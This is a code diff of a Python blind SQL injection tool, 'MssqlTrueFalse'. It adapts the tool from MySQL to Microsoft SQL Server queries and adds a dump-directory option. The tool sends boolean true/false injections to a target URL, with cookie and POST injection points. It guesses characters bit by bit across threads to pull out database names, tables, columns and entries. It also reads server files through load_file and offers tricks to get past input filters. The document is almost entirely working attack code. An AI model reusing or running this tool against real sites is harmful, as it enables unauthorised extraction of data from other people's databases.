@@ -23,7 +23,7 @@ class MssqlTrueFalse:
 
 		return sqli
 
-	def __init__(self, url, post, cookie,verbose=False,error="",modification="0"):
+	def __init__(self, url, post, cookie,verbose=False,error="",modification="0", output_dir="my_dump"):
 		self.target = 0
 		self.limit=1
 		self.stat=0
@@ -85,10 +85,10 @@ class MssqlTrueFalse:
 	def changeInject(self,new):
 		self.inject = re.sub("1=1",new,self.inject)
 
-	def value(self, request, num = 0, size=0):
+	def value(self, request, colonne, num = 1, size=0):
 
 		if size==0:
-			size=self.length(request, num)
+			size=self.length(request, colonne, num)
 			if size==0:
 				print "%s return a length of 0... It may not exist"% request
 				sys.exit()
@@ -100,7 +100,7 @@ class MssqlTrueFalse:
 			t=[]
 			for j in range(8):
 				if self.limit==1:
-					t.append(Thread(target=self.bitGuessing, args=("ascii(substring((" + request + " limit " + str(num) + ",1), " + str(i+1) + ", 1))",j,q)))
+					t.append(Thread(target=self.bitGuessing, args=("ascii(substring((select top 1 " + colonne + " from (select top " + str(num) + " " + colonne + " from (" + request + ") aq order by " + colonne + " asc) dq order by " + colonne + " desc), " + str(i+1) + ", 1))",j,q)))
 				else:
 					t.append(Thread(target=self.bitGuessing, args=("ascii(substring((" + request + "), " + str(i+1) + ", 1))",j,q)))
 				t[j].start()
@@ -111,9 +111,9 @@ class MssqlTrueFalse:
 			print val
 		return val
 
-	def length(self, request, num = 0):
+	def length(self, request, colonne, num = 1):
 		if self.limit==1:
-			return self.count("select len((" + request + " limit " + str(num) + ",1))",0,20)
+			return self.count("select len((select top 1 " + colonne + " from (select top " + str(num) + " " + colonne + " from (" + request + ") aq order by " + colonne + " asc) dq order by " + colonne + " desc))",0,20)
 		else:
 			return self.count("select len((" + request + "))",0,20)
 
@@ -126,7 +126,7 @@ class MssqlTrueFalse:
 			queue.put(0)
 
 
-	def count(self, request, begin = 0, end = 100):
+	def count(self, request, begin = 1, end = 100):
 		a=0
 		min=begin
 		max=end
@@ -221,24 +221,13 @@ class MssqlTrueFalse:
 		else:
 			return request
 
-	def dump(self, request, begin, end):
+	def dump(self, request, colonne, begin, end):
 		dump=[]
 		for i in range(begin,end):
-			dump.append(self.value(request,i))
+			dump.append(self.value(request,colonne, i))
 		return dump
 
-	def countDB(self,condition=""):
-		request=self.conditionRequest("select count(distinct(table_schema)) from information_schema.columns where table_schema!='information_schema'",condition)
-		return self.count(request)
-
-	def dumpDB(self, begin = 0, end = 0, condition=""):
-		request=self.conditionRequest("select distinct(table_schema) from information_schema.columns where table_schema!='information_schema'",condition)
-		if end==0:
-			end=self.countDB(condition)
-		print "There is %d databases with condition : %s"%(end,condition)
-		return self.dump(request,begin,end)
-
-	def dumpFile(self, file, begin = 0, end = 0):
+	def dumpFile(self, file, begin = 1, end = 0):
 		self.limit=0
 		self.changeInject(self.tricks("!isnull(load_file('%s'))"%file))
 		if not(self.testTrueFalse()):
@@ -246,30 +235,41 @@ class MssqlTrueFalse:
 			sys.exit(0)
 		request=self.conditionRequest("load_file('%s')"%file,'')
 		end=1
-		return self.dump(request,begin,end)
+		return self.dump(request,"",begin,end)
 
-	def dumpSpecial(self, function, begin = 0, end = 0):
+	def dumpSpecial(self, function, begin = 1, end = 0):
 		self.limit=0
 		request=self.conditionRequest(function,'')
-		end=1
-		return self.dump(request,begin,end)
+		end=2
+		return self.dump(request,"",begin,end)
 
-	def countTables(self,database,condition=""):
-		request=self.conditionRequest("select count(distinct(table_name)) from information_schema.columns where table_schema='"+database+"'",condition)
+	def countDB(self,condition=""):
+		request=self.conditionRequest("select count(distinct(name)) from master..sysdatabases",condition)
 		return self.count(request)
 
-	def dumpTables(self, database, begin = 0, end = 0, condition=""):
-		request=self.conditionRequest("select distinct(table_name) from information_schema.columns where table_schema='"+database+"'",condition)
+	def dumpDB(self, begin = 1, end = 0, condition=""):
+		request=self.conditionRequest("select distinct(name) from master..sysdatabases",condition)
+		if end==0:
+			end=self.countDB(condition)
+		print "There is %d databases with condition : %s"%(end,condition)
+		return self.dump(request, "name", begin,end)
+
+	def countTables(self,database,condition=""):
+		request=self.conditionRequest("select count(distinct(name)) from " + database + "..sysobjects where xtype = char(0x55)",condition)
+		return self.count(request)
+
+	def dumpTables(self, database, begin = 1, end = 0, condition=""):
+		request=self.conditionRequest("select distinct(name) from " + database + "..sysobjects where xtype = char(0x55)",condition)
 		if end==0:
 			end=self.countTables(database, condition)
 		print "There is %d tables in %s with condition : %s"%(end,database,condition)
-		return self.dump(request,begin,end)
+		return self.dump(request, "name", begin,end)
 
 	def countColumns(self,database,table,condition=""):
 		request=self.conditionRequest("select count(distinct(column_name)) from information_schema.columns where table_schema='"+database+"' and table_name='"+table+"'",condition)
 		return self.count(request)
 
-	def dumpColumns(self, database, table, begin = 0, end = 0, condition=""):
+	def dumpColumns(self, database, table, begin = 1, end = 0, condition=""):
 		request=self.conditionRequest("select distinct(column_name) from information_schema.columns where table_schema='"+database+"' and table_name='"+table+"'",condition)
 		if end==0:
 			end=self.countColumns(database, table, condition)
@@ -280,7 +280,7 @@ class MssqlTrueFalse:
 		request=self.conditionRequest("select count(distinct("+column+")) from "+database+"."+table,condition)
 		return self.count(request)
 
-	def dumpEntries(self, database, table, column, begin = 0, end = 0, condition=""):
+	def dumpEntries(self, database, table, column, begin = 1, end = 0, condition=""):
 		request=self.conditionRequest("select distinct("+column+") from "+database+"."+table,condition)
 		if end==0:
 			end=self.countEntries(database, table, column, condition)
@@ -303,17 +303,18 @@ if __name__ == "__main__":
 	parser.add_option("-s", "--session", action="store", type="string", dest="cookie",default="", help="Add cookie data with 1=.?1 where injection is")
 	parser.add_option("-E", "--Error", action="store", type="string", dest="error",default="",	help="If hard to determine good page, give some strings in 1=2 page")
 	parser.add_option("-v", "--verbose", action="store_true", dest="verbose",default=False, help="Print url request")
-	parser.add_option("-b", "--begin", action="store", type="string", dest="begin",default="0",	help="Start dumping with the <begin> line")
+	parser.add_option("-b", "--begin", action="store", type="string", dest="begin",default="1",	help="Start dumping with the <begin> line")
 	parser.add_option("-e", "--end", action="store", type="string", dest="end",default="0", help="Finish dumping with the <end> line")
 	parser.add_option("-C", "--Condition", action="store", type="string", dest="condition",default="", help="Specify condition ex : -C 'login=admin'")
 	parser.add_option("-m", "--Modif", action="store", type="string", dest="modification",default="0", help="Specify tricks to bypass filter (type -m list to list the tricks)")
+	parser.add_option("-w", "--write", action="store", type="string", dest="output_dir",default="", help="Directory to save the dump")
 
 	(options, args) = parser.parse_args()
 	if options.modification == "list":
 		print "-m 1 : transform strings with quotes to char(0x) concat"
 		sys.exit()
 
-	myInjector = MssqlTrueFalse(options.url, options.post, options.cookie, options.verbose, options.error, options.modification)
+	myInjector = MssqlTrueFalse(options.url, options.post, options.cookie, options.verbose, options.error, options.modification, options.output_dir)
 
 	if options.file!="":
 		myInjector.dumpFile(options.file,int(options.begin,10),int(options.end,10))
